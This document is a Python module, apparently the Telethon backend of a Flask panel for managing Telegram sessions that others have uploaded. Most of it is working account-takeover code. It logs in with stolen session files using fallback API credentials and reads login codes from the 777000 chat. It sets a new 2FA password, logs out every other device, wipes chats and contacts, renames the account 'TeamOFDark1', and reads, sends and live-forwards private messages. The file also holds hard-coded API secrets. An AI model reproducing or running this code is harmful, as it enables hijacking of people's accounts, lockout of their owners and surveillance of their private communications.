"""
Telethon bridge for the Flask web app.

Flask runs synchronously (one thread per request); Telethon needs an asyncio
event loop. We start a single background thread that owns one long-lived
asyncio event loop, and every Telethon call from a Flask route is submitted
to that loop with `run_async()` and waited on synchronously.

Live-connected clients are cached in `live_clients` keyed by the DB session id,
so repeated actions (Get OTP, Devices, etc.) on the same session reuse one
connection instead of reconnecting every time.
"""
import asyncio
import threading
import queue
import re
import tempfile
import os

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.account import (
    GetAuthorizationsRequest, ResetAuthorizationRequest,
    GetPasswordRequest, ResetPasswordRequest, UpdateProfileRequest, UpdateUsernameRequest
)
from telethon.tl.functions.contacts import (
    GetContactsRequest, DeleteContactsRequest, GetBlockedRequest, UnblockRequest, SearchRequest
)
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.errors import FloodWaitError

API_ID = 38785545
API_HASH = "d5ad8c7bd2b01e837e2deb0b41dee770"
CLEAN_ACCOUNT_NAME = "TeamOFDark1"

# Fallback api_id/api_hash pairs — tried in order when logging a session in,
# same list the Telegram bot uses, in case the primary app's auth key for
# that account was revoked.
API_PAIRS = [
    (API_ID, API_HASH),
    (2040, "b18441a1ff607e10a989891a5462e627"),
    (4, "014b35b6184100b085b0d0572f9b5103"),
    (6, "eb06d4abfb49dc3eeb1aeb98ae0f581e"),
]

# ─────────────────────── background event loop ───────────────────────
_loop = asyncio.new_event_loop()


def _loop_runner():
    asyncio.set_event_loop(_loop)
    _loop.run_forever()


_thread = threading.Thread(target=_loop_runner, daemon=True)
_thread.start()


def run_async(coro, timeout=60):
    """Run a coroutine on the background loop from a sync Flask route and
    block until it finishes (or raise on timeout/exception)."""
    fut = asyncio.run_coroutine_threadsafe(coro, _loop)
    return fut.result(timeout=timeout)


# ─────────────────────── live client registry ───────────────────────
live_clients = {}          # session_id -> TelegramClient (connected)
give_message_queues = {}   # session_id -> queue.Queue (thread-safe) of message dicts
give_message_handlers = {} # session_id -> registered event handler callback


async def _connect_string(ss_str, aid, ahash):
    cl = TelegramClient(StringSession(ss_str), aid, ahash)
    await cl.connect()
    if await cl.is_user_authorized():
        return cl
    await cl.disconnect()
    return None


async def _load_from_raw(raw: bytes):
    """Try to build a connected, authorized client from raw bytes (either a
    StringSession's text, or a raw SQLite .session file). Returns
    (client, session_string) or (None, None)."""
    is_sqlite = raw[:16] == b"SQLite format 3\x00"

    if not is_sqlite:
        try:
            ss_str = raw.decode("utf-8").strip()
            for aid, ahash in API_PAIRS:
                try:
                    cl = await _connect_string(ss_str, aid, ahash)
                    if cl:
                        return cl, ss_str
                except Exception:
                    pass
        except Exception:
            pass

    tmp = tempfile.mktemp(suffix=".session")
    try:
        with open(tmp, "wb") as f:
            f.write(raw)
        for aid, ahash in API_PAIRS:
            cl = None
            try:
                cl = TelegramClient(tmp, aid, ahash)
                await cl.connect()
                if await cl.is_user_authorized():
                    ss_str = StringSession.save(cl.session)
                    await cl.disconnect()
                    cl2 = await _connect_string(ss_str, aid, ahash)
                    if cl2:
                        return cl2, ss_str
                else:
                    await cl.disconnect()
            except Exception:
                if cl:
                    try:
                        await cl.disconnect()
                    except Exception:
                        pass
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass

    return None, None


def login_from_bytes(raw: bytes):
    """Sync wrapper: returns (session_string, name, phone) or raises ValueError."""
    cl, ss = run_async(_load_from_raw(raw))
    if not cl:
        raise ValueError("Could not authorize this session (invalid, expired, or revoked).")
    me = run_async(cl.get_me())
    name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "Unknown"
    phone = me.phone or "unknown"

    async def _disc():
        await cl.disconnect()

    run_async(_disc())
    return ss, name, phone


def get_client(session_row):
    """Return a live, connected client for a stored session row, reusing a
    cached connection when available."""
    sid = session_row["id"]
    cl = live_clients.get(sid)
    if cl and cl.is_connected():
        return cl

    async def _reconnect():
        for aid, ahash in API_PAIRS:
            c = await _connect_string(session_row["session_string"], aid, ahash)
            if c:
                return c
        return None

    cl = run_async(_reconnect())
    if not cl:
        raise ValueError("This session is no longer valid (logged out or revoked on Telegram's side).")
    live_clients[sid] = cl
    return cl


def drop_client(session_id):
    cl = live_clients.pop(session_id, None)
    if cl:
        async def _disc():
            try:
                await cl.disconnect()
            except Exception:
                pass
        run_async(_disc())


# ─────────────────────── feature functions ───────────────────────

def fetch_otp(session_row):
    cl = get_client(session_row)

    async def _f():
        msgs = await cl.get_messages(777000, limit=10)
        for m in (msgs or []):
            if not m.text:
                continue
            found = re.findall(r"\b\d{5,6}\b", m.text)
            if found:
                return {"code": found[0], "full": m.text}
        return None

    return run_async(_f())


def send_message(session_row, target, text):
    """Send a text message from this session's account to `target`, which can
    be a @username (str) or an existing dialog's peer id (int)."""
    cl = get_client(session_row)

    async def _f():
        msg = await cl.send_message(target, text)
        return {
            "message_id": msg.id,
            "to": str(target),
            "sent_at": str(msg.date),
        }

    return run_async(_f())


def list_dialogs(session_row, limit=50):
    """Return this account's chat list (like Telegram's main screen) —
    name, type, unread count, and a preview of the last message."""
    cl = get_client(session_row)

    async def _f():
        out = []
        async for d in cl.iter_dialogs(limit=limit):
            last = d.message
            out.append({
                "id": d.id,
                "name": d.name or getattr(d.entity, "title", None) or "Unknown",
                "is_user": d.is_user, "is_group": d.is_group, "is_channel": d.is_channel,
                "unread_count": d.unread_count,
                "last_text": (last.text if (last and last.text) else ("[media]" if (last and last.media) else "")),
                "last_date": str(last.date) if last else "",
                "last_out": bool(last.out) if last else False,
            })
        return out

    return run_async(_f())


def get_messages(session_row, peer_ref, limit=40):
    """Return recent message history for one dialog, oldest first (like
    opening a chat in Telegram)."""
    cl = get_client(session_row)

    async def _f():
        msgs = await cl.get_messages(peer_ref, limit=limit)
        out = []
        for m in reversed(list(msgs)):
            out.append({
                "id": m.id,
                "text": m.text or ("[media]" if m.media else ""),
                "date": str(m.date),
                "out": bool(m.out),
            })
        return out

    return run_async(_f())


def search_dialogs(session_row, query, limit=20):
    """Search Telegram globally for users/chats/channels by username or name.

    This uses Telegram's contacts.search, so results are real Telegram entities,
    not locally fabricated search results.
    """
    cl = get_client(session_row)
    query = (query or "").strip().lstrip("@")
    if not query:
        return []

    async def _f():
        result = await cl(SearchRequest(q=query, limit=max(1, min(int(limit), 50))))
        out = []
        for entity in list(getattr(result, "users", [])) + list(getattr(result, "chats", [])):
            is_user = bool(getattr(entity, "bot", False) is not None and hasattr(entity, "first_name"))
            first = getattr(entity, "first_name", "") or ""
            last = getattr(entity, "last_name", "") or ""
            title = getattr(entity, "title", "") or ""
            name = (f"{first} {last}").strip() or title or "Unknown"
            out.append({
                "id": entity.id,
                "name": name,
                "username": getattr(entity, "username", None),
                "is_user": hasattr(entity, "first_name"),
                "is_bot": bool(getattr(entity, "bot", False)),
                "is_group": bool(getattr(entity, "megagroup", False) or entity.__class__.__name__.lower().endswith("chat")),
                "is_channel": entity.__class__.__name__.lower().endswith("channel"),
            })
        return out

    return run_async(_f())


def set_2fa_password(session_row, current_password, new_password, hint=None):
    """Directly set/change the account's 2FA password (not the official
    Telegram reset-flow — this works immediately when the current password,
    if any, is known)."""
    cl = get_client(session_row)

    async def _f():
        await cl.edit_2fa(
            current_password=current_password or None,
            new_password=new_password,
            hint=hint or "",
        )
        return True

    return run_async(_f())


def get_devices(session_row):
    cl = get_client(session_row)

    async def _f():
        auths = await cl(GetAuthorizationsRequest())
        out = []
        for i, a in enumerate(auths.authorizations):
            out.append({
                "index": i, "current": a.current, "device_model": a.device_model,
                "platform": a.platform, "app_name": a.app_name, "app_version": a.app_version,
                "ip": a.ip, "country": a.country or "?",
                "date_active": str(a.date_active), "date_created": str(a.date_created),
                "hash": str(a.hash),
            })
        return out

    return run_async(_f())


def logout_device(session_row, device_hash):
    cl = get_client(session_row)

    async def _f():
        await cl(ResetAuthorizationRequest(hash=device_hash))
        return True

    return run_async(_f())


def logout_all_other_devices(session_row):
    cl = get_client(session_row)

    async def _f():
        auths = await cl(GetAuthorizationsRequest())
        n = 0
        for a in auths.authorizations:
            if not a.current:
                try:
                    await cl(ResetAuthorizationRequest(hash=a.hash))
                    n += 1
                except Exception:
                    pass
        return n

    return run_async(_f())


def reset_2fa(session_row):
    """Start Telegram's official 2FA password reset flow.

    This does NOT delete/reset the Telegram account. Telegram may require a
    recovery-email confirmation or impose a server-side waiting period.
    """
    cl = get_client(session_row)

    async def _f():
        result = await cl(ResetPasswordRequest())
        name = result.__class__.__name__
        data = {"type": name}
        for attr in ("retry_date", "wait", "phone_code_hash"):
            if hasattr(result, attr):
                data[attr] = getattr(result, attr)
        if name == "ResetPasswordOk":
            data["message"] = "Telegram accepted the 2FA reset."
        elif name == "ResetPasswordRequestedWait":
            data["message"] = "Telegram requires a waiting period before the password can be reset."
        elif name == "ResetPasswordFailedWait":
            data["message"] = "Telegram did not allow the reset yet; the server returned a waiting restriction."
        else:
            data["message"] = "Telegram returned a 2FA reset status."
        return data

    return run_async(_f())


def get_2fa_status(session_row):
    cl = get_client(session_row)

    async def _f():
        try:
            pwd = await cl(GetPasswordRequest())
            return {"enabled": pwd.has_password, "hint": getattr(pwd, "hint", "") or ""}
        except Exception as e:
            return {"enabled": False, "hint": "", "error": str(e)}

    return run_async(_f())


def clean_account(session_row):
    cl = get_client(session_row)

    async def _f():
        left_channels = left_groups = deleted_chats = failed = 0
        try:
            async for dialog in cl.iter_dialogs():
                try:
                    if dialog.is_channel:
                        await cl.delete_dialog(dialog.entity); left_channels += 1
                    elif dialog.is_group:
                        await cl.delete_dialog(dialog.entity); left_groups += 1
                    else:
                        await cl.delete_dialog(dialog.entity); deleted_chats += 1
                except Exception:
                    failed += 1
        except Exception:
            pass

        deleted_contacts = 0
        try:
            contacts = await cl(GetContactsRequest(hash=0))
            ids = [u.id for u in getattr(contacts, "users", [])]
            if ids:
                await cl(DeleteContactsRequest(id=ids))
                deleted_contacts = len(ids)
        except Exception:
            pass

        unblocked = 0
        try:
            offset = 0
            while True:
                blocked = await cl(GetBlockedRequest(offset=offset, limit=100))
                peers = getattr(blocked, "blocked", [])
                if not peers:
                    break
                for p in peers:
                    try:
                        entity = await cl.get_entity(p.peer_id)
                        await cl(UnblockRequest(id=entity))
                        unblocked += 1
                    except Exception:
                        pass
                if len(peers) < 100:
                    break
                offset += len(peers)
        except Exception:
            pass

        name_reset = False
        try:
            await cl(UpdateProfileRequest(first_name=CLEAN_ACCOUNT_NAME, last_name=""))
            name_reset = True
        except Exception:
            pass

        username_removed = False
        try:
            await cl(UpdateUsernameRequest(username=""))
            username_removed = True
        except Exception:
            pass

        return {
            "left_channels": left_channels, "left_groups": left_groups,
            "deleted_chats": deleted_chats, "failed": failed,
            "deleted_contacts": deleted_contacts, "unblocked": unblocked,
            "name_reset": name_reset, "username_removed": username_removed,
        }

    return run_async(_f())


def change_dp(session_row, photo_bytes):
    cl = get_client(session_row)

    async def _f():
        tmp = tempfile.mktemp(suffix=".jpg")
        with open(tmp, "wb") as f:
            f.write(photo_bytes)
        try:
            file = await cl.upload_file(tmp)
            await cl(UploadProfilePhotoRequest(file=file))
            return True
        finally:
            try:
                os.remove(tmp)
            except Exception:
                pass

    return run_async(_f())


def logout_session(session_row):
    cl = get_client(session_row)

    async def _f():
        try:
            await cl.log_out()
        except Exception:
            pass

    run_async(_f())
    drop_client(session_row["id"])


def get_session_string(session_row):
    return session_row["session_string"]


# ─────────────────────── "Give Message" live forwarding ───────────────────────

def give_message_active(session_id):
    return session_id in give_message_handlers


def start_give_message(session_row):
    sid = session_row["id"]
    if sid in give_message_handlers:
        return  # already running
    cl = get_client(session_row)
    q = queue.Queue()
    give_message_queues[sid] = q

    async def _handler(event):
        try:
            sender = await event.get_sender()
            who = getattr(sender, "first_name", None) or getattr(sender, "title", None) or "Unknown"
            q.put_nowait({
                "from": str(who),
                "text": event.raw_text or "<non-text message>",
            })
        except Exception as e:
            q.put_nowait({"from": "?", "text": f"<error reading message: {e}>"})

    async def _register():
        cl.add_event_handler(_handler, events.NewMessage(incoming=True))

    run_async(_register())
    give_message_handlers[sid] = _handler


def stop_give_message(session_row):
    sid = session_row["id"]
    handler = give_message_handlers.pop(sid, None)
    give_message_queues.pop(sid, None)
    if handler:
        cl = live_clients.get(sid)
        if cl:
            async def _unregister():
                cl.remove_event_handler(handler)
            try:
                run_async(_unregister())
            except Exception:
                pass


def pop_give_messages(session_id, block_timeout=15):
    """Block (up to block_timeout seconds) waiting for the next live message,
    for use in an SSE stream. Returns None on timeout (caller should send a
    keep-alive and call again)."""
    q = give_message_queues.get(session_id)
    if not q:
        return None
    try:
        return q.get(timeout=block_timeout)
    except queue.Empty:
        return None
